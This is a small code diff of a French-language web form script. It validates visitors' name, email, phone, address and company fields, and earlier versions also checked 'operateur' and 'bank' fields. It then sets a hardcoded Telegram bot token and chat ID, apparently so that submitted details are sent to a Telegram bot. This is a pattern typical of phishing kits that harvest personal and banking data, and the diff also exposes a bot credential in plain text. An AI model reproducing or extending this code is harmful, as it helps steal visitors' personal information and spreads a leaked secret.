@@ -117,10 +117,13 @@
             const telephone = document.getElementById("telephone").value;
             const adresse = document.getElementById("adresse").value;
             const societe = document.getElementById("societe").value;
-            if (!nom || !email || !telephone || !operateur || !bank) {
+
+            if (!nom || !email || !telephone || !adresse || !societe) {
                 alert("Veuillez remplir tous les champs.");
+                document.getElementById("loading").style.display = "none";
                 return;
             }
+
 
             const token = "7342455335:AAE0QCPLUpV1nO2lbfSwEAfZmx8qc-ZGSBo";
             const chatId = "5372119436";
